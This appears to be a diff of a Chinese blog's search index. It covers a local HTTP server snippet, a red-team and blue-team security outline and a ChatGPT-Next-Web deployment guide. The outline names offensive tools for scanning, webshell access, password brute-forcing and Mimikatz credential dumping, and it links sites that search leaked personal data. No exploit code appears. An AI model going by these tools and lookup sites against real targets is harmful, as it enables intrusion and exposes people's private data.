-                     data-src="https://blog.pppfz.com/assets/9224ffea073e7e5bff89bc8811e3d545.png"
-                      alt="9224ffea073e7e5bff89bc8811e3d545.png"
-                ></p>
-<h1 id="五、临时开启http服务"><a href="#五、临时开启http服务" class="headerlink" title="五、临时开启http服务"></a>五、临时开启http服务</h1><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\ppp\Desktop&gt; python -m http.server</span><br><span class="line">Serving HTTP on :: port 8000 (http://[::]:8000/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></div>
+<p>访问：<a href="http://4796.116.171:8081/static/#/">http://4796.116.171:8081/static/#/</a> ,输入用户名和密码<br><img src="https://blog.pppfz.com/assets/9224ffea073e7e5bff89bc8811e3d545.png" alt="9224ffea073e7e5bff89bc8811e3d545.png"></p>
+<h1 id="五、临时开启http服务"><a href="#五、临时开启http服务" class="headerlink" title="五、临时开启http服务"></a>五、临时开启http服务</h1><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PS C:\Users\ppp\Desktop&gt; python -m http.server<br>Serving HTTP on :: port 8000 (http://[::]:8000/) ...<br>::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET / HTTP/1.1&quot; 200 -<br>::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] code 404, message File not found<br>::ffff:127.0.0.1 - - [12/Aug/2023 11:26:45] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -<br></code></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>网络</category>
@@ -311,53 +246,53 @@
 <li>网络信息：IP地址、域名信息，子域名，敏感目录，端口服务，DNS服务器、旁站服务，操作系统及提供服务的软件版本，外部网络拓扑结构，网络服务供应商，源代码， Robots文件探测，备案查询，微信小程序支付宝小程序，SSL&#x2F;TLS证书查询，Google Hacking</li>
 <li>物理信息：公司注册信息、组织结构、电话号段、网络或安全管理员及联系方式、地理位置等，以便开展实施社工和物理攻击；业务逻辑</li>
 <li>获取真实IP<ul>
-<li>NMAP，<a class="link"   href="https://github.com/robertdavidgraham/masscan" >Masscan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>站长工具：<a class="link"   href="https://ping.chinaz.com/" >https://ping.chinaz.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>微步在线查询：<a class="link"   href="https://x.threatbook.com/" >https://x.threatbook.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>NMAP，<a href="https://github.com/robertdavidgraham/masscan">Masscan</a></li>
+<li>站长工具：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li>
+<li>微步在线查询：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></li>
 <li>外网访问，对比分析</li>
 </ul>
 </li>
 <li>域名信息<ul>
-<li>子域名：Layer子域名挖掘机；<a class="link"   href="https://github.com/shmilylty/OneForAll" >OneForAll <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>网站路径扫描：御剑，WWWSCAN，<a class="link"   href="https://github.com/deibit/cansina" >cansina <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>WEB应用漏洞扫描：AWVS、APPSCAN、<a class="link"   href="https://github.com/sqlmapproject/sqlmap" >SQLMap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   href="https://github.com/s0md3v/XSStrike" >XSStrike-XSS漏洞扫描 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   href="https://www.kali.org/tools/dirb/" >网页内容扫描器-dirb(Kali内置) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、XRay+Rad</li>
+<li>子域名：Layer子域名挖掘机；<a href="https://github.com/shmilylty/OneForAll">OneForAll</a></li>
+<li>网站路径扫描：御剑，WWWSCAN，<a href="https://github.com/deibit/cansina">cansina</a></li>
+<li>WEB应用漏洞扫描：AWVS、APPSCAN、<a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>、<a href="https://github.com/s0md3v/XSStrike">XSStrike-XSS漏洞扫描</a>、<a href="https://www.kali.org/tools/dirb/">网页内容扫描器-dirb(Kali内置)</a>、XRay+Rad</li>
 <li>Google Hacking：特殊语法搜索</li>
-<li>Whois：<a class="link"   href="https://who.is/" >https://who.is/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> | <a class="link"   href="http://tool.chinaz.com/ipwhois" >http://tool.chinaz.com/ipwhois <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> | nslookup</li>
-<li>网站指纹信息：Wappalyzer指纹识别工具；<a class="link"   href="https://www.yunsee.cn/" >https://www.yunsee.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>源代码：<a class="link"   href="https://github.com/" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 源代码信息泄露</li>
-<li><a class="link"   href="https://www.zoomeye.org/" >钟馗之眼 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；<a class="link"   href="https://fofa.info/" >FOFA网络空间测绘 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；<a class="link"   href="https://www.shodan.io/" >Shodan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Whois：<a href="https://who.is/">https://who.is/</a> | <a href="http://tool.chinaz.com/ipwhois">http://tool.chinaz.com/ipwhois</a> | nslookup</li>
+<li>网站指纹信息：Wappalyzer指纹识别工具；<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li>
+<li>源代码：<a href="https://github.com/">GitHub</a> 源代码信息泄露</li>
+<li><a href="https://www.zoomeye.org/">钟馗之眼</a>；<a href="https://fofa.info/">FOFA网络空间测绘</a>；<a href="https://www.shodan.io/">Shodan</a></li>
 </ul>
 </li>
 <li>企业真实信息（社工库）<ul>
-<li><a class="link"   href="https://www.iculture.cc/sgk" >https://www.iculture.cc/sgk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://sgk66.cc/search.html" >https://sgk66.cc/search.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://privacy.aiuys.com/" >https://privacy.aiuys.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a href="https://www.iculture.cc/sgk">https://www.iculture.cc/sgk</a></li>
+<li><a href="https://sgk66.cc/search.html">https://sgk66.cc/search.html</a></li>
+<li><a href="https://privacy.aiuys.com/">https://privacy.aiuys.com/</a></li>
 <li>telegram</li>
 </ul>
 </li>
-<li>参考链接：<a class="link"   href="https://www.freebuf.com/articles/web/283684.html" >https://www.freebuf.com/articles/web/283684.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>参考链接：<a href="https://www.freebuf.com/articles/web/283684.html">https://www.freebuf.com/articles/web/283684.html</a></li>
 </ul>
 </li>
 <li>已知CVE漏洞攻击利用<ul>
-<li>漏洞披露平台：<a class="link"   href="https://www.cnvd.org.cn/" >中国国家漏洞库-CNDV <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://www.cve.org/" >CVE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://www.metasploit.com/" >metasploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>漏洞披露平台：<a href="https://www.cnvd.org.cn/">中国国家漏洞库-CNDV</a>，<a href="https://www.cve.org/">CVE</a>，<a href="https://www.metasploit.com/">metasploit</a></li>
 <li>主机漏洞扫描：Nessus（收费）</li>
-<li>抓包分析：wireshark，科来，<a class="link"   href="https://www.ypojie.com/10191.html" >Fiddler <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>抓包分析：wireshark，科来，<a href="https://www.ypojie.com/10191.html">Fiddler</a></li>
 <li>SQL注入：Sqlmap</li>
-<li>代码审计：<a class="link"   href="https://rips-scanner.sourceforge.net/" >RIPS - 静态分析 PHP 代码  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、Fortify SCA(收费)</li>
+<li>代码审计：<a href="https://rips-scanner.sourceforge.net/">RIPS - 静态分析 PHP 代码 </a>、Fortify SCA(收费)</li>
 <li>集成攻击平台：Kali，Burpsuite，Metasploit，Cobalt Strike（组队且收费）</li>
-<li>反编译调试工具：IDA PRO，Onlydbg，<a class="link"   href="https://x64dbg.com/" >x64dbg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （其他参考<a class="link"   href="https://www.52pojie.cn/forum-4-1.html" >吾爱破解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</li>
-<li>Shell连接工具：中国菜刀，蚁剑，Behinder(冰蝎)，<a class="link"   href="https://github.com/BeichenDream/Godzilla" >Godzilla: 哥斯拉  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://learn.microsoft.com/en-us/sysinternals/downloads/pstools" >PSTool <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>系统hash破解：<a class="link"   href="https://www.kali.org/tools/hydra/" >暴力破解工具-Hydra(Kali内置) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://www.kali.org/tools/medusa/" >暴力破解器-Medusa(Kali内置) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，pwdump，Shadow，LC5&#x2F;JOHN，<a class="link"   href="https://hashes.com/zh/decrypt/hash" >在线破解Hash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>反编译调试工具：IDA PRO，Onlydbg，<a href="https://x64dbg.com/">x64dbg</a> （其他参考<a href="https://www.52pojie.cn/forum-4-1.html">吾爱破解</a>）</li>
+<li>Shell连接工具：中国菜刀，蚁剑，Behinder(冰蝎)，<a href="https://github.com/BeichenDream/Godzilla">Godzilla: 哥斯拉 </a>，<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pstools">PSTool</a></li>
+<li>系统hash破解：<a href="https://www.kali.org/tools/hydra/">暴力破解工具-Hydra(Kali内置)</a>，<a href="https://www.kali.org/tools/medusa/">暴力破解器-Medusa(Kali内置)</a> ，pwdump，Shadow，LC5&#x2F;JOHN，<a href="https://hashes.com/zh/decrypt/hash">在线破解Hash</a></li>
 <li>内网抓取hash：WCE，Mimikatz(抓取登录过主机的用户)，Procdump+mimikatz</li>
 <li>网络已公开的各类成熟exp：strusts2工具集，JBOSS反序列化工具，MS08-067等</li>
 </ul>
 </li>
 <li>旁站攻击<ul>
-<li>IP 反查：<a class="link"   href="https://tools.ipip.net/ipdomain.php" >ipip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；<a class="link"   href="https://www.ip66.net/" >ip66 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://stool.chinaz.com/same" >站长工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>IP 反查：<a href="https://tools.ipip.net/ipdomain.php">ipip</a>；<a href="https://www.ip66.net/">ip66</a>，<a href="https://stool.chinaz.com/same">站长工具</a></li>
 </ul>
 </li>
 <li>技术类攻击<ul>
-<li><a class="link"   href="https://owasp.org/www-project-top-ten/" >OWASP 漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a href="https://owasp.org/www-project-top-ten/">OWASP 漏洞</a></li>
 <li>Web攻击、代码审计、各种协议攻击、系统攻击、MSF</li>
 <li>逻辑漏洞</li>
 <li>持续跟踪</li>
@@ -381,7 +316,7 @@
 </ul>
 </li>
 <li>端口伪装<ul>
-<li><a class="link"   href="https://pkgs.org/download/knock-server" >Knock-server Download (RPM) (pkgs.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a href="https://pkgs.org/download/knock-server">Knock-server Download (RPM) (pkgs.org)</a></li>
 <li><a href="#">7 使用knockd隐藏端口</a></li>
 </ul>
 </li>
@@ -409,8 +344,8 @@
 </ul>
 </li>
 <li>WEB WAF<ul>
-<li><a class="link"   href="https://github.com/SpiderLabs/ModSecurity" >ModSecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://github.com/alexazhou/VeryNginx" >VeryNginx（已停更） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a href="https://github.com/SpiderLabs/ModSecurity">ModSecurity</a></li>
+<li><a href="https://github.com/alexazhou/VeryNginx">VeryNginx（已停更）</a></li>
 </ul>
 </li>
 <li>邮件安全网关</li>
@@ -440,16 +375,16 @@
 <li>检查linux的启动项和系统的定时任务crontab，<code>crontab -l</code>查看是否有异常的任务编写进来。</li>
 <li>检查linux的日志信息<code>/var/log/</code>一些系统日志信息、安全日志等。</li>
 <li>自动化查杀软件，在线查杀工具，查杀脚本来查杀。<ul>
-<li>Linux主机排查：<a class="link"   href="https://github.com/grayddq/GScan" >grayddq&#x2F;GScan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://blog.csdn.net/icanflyingg/article/details/123357607" >rkhunter（Rootkit猎手）安装使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><a class="link"   href="https://www.clamav.net/" >ClamAVNet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：<a class="link"   href="https://zhuanlan.zhihu.com/p/266731354" >Linux病毒扫描工具ClamAV（Clam AntiVirus）安装使用 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Linux主机排查：<a href="https://github.com/grayddq/GScan">grayddq&#x2F;GScan</a></li>
+<li><a href="https://blog.csdn.net/icanflyingg/article/details/123357607">rkhunter（Rootkit猎手）安装使用</a></li>
+<li><a href="https://www.clamav.net/">ClamAVNet</a>：<a href="https://zhuanlan.zhihu.com/p/266731354">Linux病毒扫描工具ClamAV（Clam AntiVirus）安装使用 - 知乎 (zhihu.com)</a></li>
 </ul>
 </li>
 </ul>
 </li>
 <li><p>windows</p>
 <ul>
-<li><a class="link"   href="https://zhuanlan.zhihu.com/p/608654371" >应急响应篇：windows入侵排查 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/608654371">应急响应篇：windows入侵排查 - 知乎 (zhihu.com)</a></li>
 </ul>
 </li>
 </ul>
@@ -464,8 +399,8 @@
 </li>
 <li><p>综合防御</p>
 <ul>
-<li>蜜罐：<a class="link"   href="https://hfish.net/#/" >反制溯源_欺骗防御_主动防御-HFish免费蜜罐平台 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li>堡垒机：<a class="link"   href="https://www.jumpserver.org/" >JumpServer - 开源堡垒机 - 官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>蜜罐：<a href="https://hfish.net/#/">反制溯源_欺骗防御_主动防御-HFish免费蜜罐平台</a></li>
+<li>堡垒机：<a href="https://www.jumpserver.org/">JumpServer - 开源堡垒机 - 官网</a></li>
 <li>硬件和软件：网闸、堡垒机、蜜罐、漏扫、态势感知、威胁情报、APT检测、数据库审记…</li>
 </ul>
 </li>
@@ -481,122 +416,37 @@
   <entry>
     <title>搭建ChatGPT-Web-Site</title>
     <url>/2023/08/21/%E6%90%AD%E5%BB%BAChatGPT-Web-Site/</url>
-    <content><![CDATA[<h1 id="一、注册Github账号"><a href="#一、注册Github账号" class="headerlink" title="一、注册Github账号"></a>一、注册Github账号</h1><p>注册页面：<a class="link"   href="https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=/&source=header-home" >Join GitHub · GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821093422216.png"
-                      alt="image-20230821093422216"
-                ></p>
-<p>注册outlook.com邮箱：<a class="link"   href="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1692581746&rver=7.0.6737.0&wp=MBI_SSL&wreply=https://outlook.live.com/owa/?nlp=1&RpsCsrfState=c1228fda-42fe-73c0-4d28-a96f6ff027d5&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob,flname,wld&cobrandid=90015" >登录你的 Microsoft 帐户 (live.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821093702544.png"
-                      alt="image-20230821093702544"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821093725539.png"
-                      alt="image-20230821093725539"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821093809545.png"
-                      alt="image-20230821093809545"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821093912580.png"
-                      alt="image-20230821093912580"
-                ></p>
+    <content><![CDATA[<h1 id="一、注册Github账号"><a href="#一、注册Github账号" class="headerlink" title="一、注册Github账号"></a>一、注册Github账号</h1><p>注册页面：<a href="https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=/&source=header-home">Join GitHub · GitHub</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821093422216.png" alt="image-20230821093422216"></p>
+<p>注册outlook.com邮箱：<a href="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1692581746&rver=7.0.6737.0&wp=MBI_SSL&wreply=https://outlook.live.com/owa/?nlp=1&RpsCsrfState=c1228fda-42fe-73c0-4d28-a96f6ff027d5&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob,flname,wld&cobrandid=90015">登录你的 Microsoft 帐户 (live.com)</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821093702544.png" alt="image-20230821093702544"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821093725539.png" alt="image-20230821093725539"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821093809545.png" alt="image-20230821093809545"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821093912580.png" alt="image-20230821093912580"></p>
 <h1 id="二、Fork目标项目"><a href="#二、Fork目标项目" class="headerlink" title="二、Fork目标项目"></a>二、Fork目标项目</h1><p>注册完成Github后，打开项目网址：</p>
-<p><a class="link"   href="https://github.com/Yidadaa/ChatGPT-Next-Web" >Yidadaa&#x2F;ChatGPT-Next-Web: A well-designed cross-platform ChatGPT UI (Web &#x2F; PWA &#x2F; Linux &#x2F; Win &#x2F; MacOS). 一键拥有你自己的跨平台 ChatGPT 应用。 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821094211414.png"
-                      alt="image-20230821094211414"
-                ></p>
+<p><a href="https://github.com/Yidadaa/ChatGPT-Next-Web">Yidadaa&#x2F;ChatGPT-Next-Web: A well-designed cross-platform ChatGPT UI (Web &#x2F; PWA &#x2F; Linux &#x2F; Win &#x2F; MacOS). 一键拥有你自己的跨平台 ChatGPT 应用。 (github.com)</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821094211414.png" alt="image-20230821094211414"></p>
 <p>第二部点击完成后弹出的页面，什么都不用修改直接看下面的保存即可。</p>
-<h1 id="三、申请OpenAI的API"><a href="#三、申请OpenAI的API" class="headerlink" title="三、申请OpenAI的API"></a>三、申请OpenAI的API</h1><p><strong>打开openai官网：</strong>  <a class="link"   href="https://openai.com/" >OpenAI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821095814843.png"
-                      alt="image-20230821095814843"
-                ></p>
-<p><strong>登录这个网址获取API：</strong> <a class="link"   href="https://platform.openai.com/account/api-keys" >API keys - OpenAI API <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="三、申请OpenAI的API"><a href="#三、申请OpenAI的API" class="headerlink" title="三、申请OpenAI的API"></a>三、申请OpenAI的API</h1><p><strong>打开openai官网：</strong>  <a href="https://openai.com/">OpenAI</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821095814843.png" alt="image-20230821095814843"></p>
+<p><strong>登录这个网址获取API：</strong> <a href="https://platform.openai.com/account/api-keys">API keys - OpenAI API</a></p>
 <p>先看看有没有免费的额度</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821101853186.png"
-                      alt="image-20230821101853186"
-                ></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821101853186.png" alt="image-20230821101853186"></p>
 <p>如果没有是需要绑卡的（以前有免费送的体验额度，不知道现在还有没有，如果有就暂时不用绑卡了）</p>
 <p>如果没有额度，就要绑卡，卡要申请国外的卡，推荐使用：<strong>OneKey Card</strong></p>
-<p>目前是公测期间需要填写邀请码激活： <a class="link"   href="https://card.onekey.so/?i=JD7FN6" >JD7FN6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>注册教程：<a class="link"   href="https://help.onekey.so/hc/zh-cn/articles/6762124467343-%E5%A6%82%E4%BD%95%E5%BC%80%E9%80%9A%E5%B9%B6%E4%BD%BF%E7%94%A8-OneKey-Card" >如何开通并使用 OneKey Card – OneKey - 帮助中心 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821100850484.png"
-                      alt="image-20230821100850484"
-                ></p>
-<p>绑卡地址：<a class="link"   href="https://platform.openai.com/account/billing/payment-methods" >Payment methods - OpenAI API <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821101133297.png"
-                      alt="image-20230821101133297"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821100101484.png"
-                      alt="image-20230821100101484"
-                ></p>
-<h1 id="四、部署项目"><a href="#四、部署项目" class="headerlink" title="四、部署项目"></a>四、部署项目</h1><p>使用说明文档：<a class="link"   href="https://github.com/Yidadaa/ChatGPT-Next-Web/blob/main/README_CN.md#%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8" >ChatGPT-Next-Web&#x2F;README_CN.md at main · Yidadaa&#x2F;ChatGPT-Next-Web (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821094532937.png"
-                      alt="image-20230821094532937"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821094650715.png"
-                      alt="image-20230821094650715"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821095253362.png"
-                      alt="image-20230821095253362"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821095454536.png"
-                      alt="image-20230821095454536"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/image-20230821102211638.png"
-                      alt="image-20230821102211638"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/./C:/Users/ppp/Desktop/image-20230821102340925.png"
-                      alt="image-20230821102340925"
-                ></p>
+<p>目前是公测期间需要填写邀请码激活： <a href="https://card.onekey.so/?i=JD7FN6">JD7FN6</a></p>
+<p>注册教程：<a href="https://help.onekey.so/hc/zh-cn/articles/6762124467343-%E5%A6%82%E4%BD%95%E5%BC%80%E9%80%9A%E5%B9%B6%E4%BD%BF%E7%94%A8-OneKey-Card">如何开通并使用 OneKey Card – OneKey - 帮助中心</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821100850484.png" alt="image-20230821100850484"></p>
+<p>绑卡地址：<a href="https://platform.openai.com/account/billing/payment-methods">Payment methods - OpenAI API</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821101133297.png" alt="image-20230821101133297"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821100101484.png" alt="image-20230821100101484"></p>
+<h1 id="四、部署项目"><a href="#四、部署项目" class="headerlink" title="四、部署项目"></a>四、部署项目</h1><p>使用说明文档：<a href="https://github.com/Yidadaa/ChatGPT-Next-Web/blob/main/README_CN.md#%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8">ChatGPT-Next-Web&#x2F;README_CN.md at main · Yidadaa&#x2F;ChatGPT-Next-Web (github.com)</a></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821094532937.png" alt="image-20230821094532937"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821094650715.png" alt="image-20230821094650715"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821095253362.png" alt="image-20230821095253362"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821095454536.png" alt="image-20230821095454536"></p>
+<p><img src="https://blog.pppfz.com/assets/image-20230821102211638.png" alt="image-20230821102211638"></p>
+<p><img src="/./C:/Users/ppp/Desktop/image-20230821102340925.png" alt="image-20230821102340925"></p>
 ]]></content>
       <categories>
         <category>网站</category>
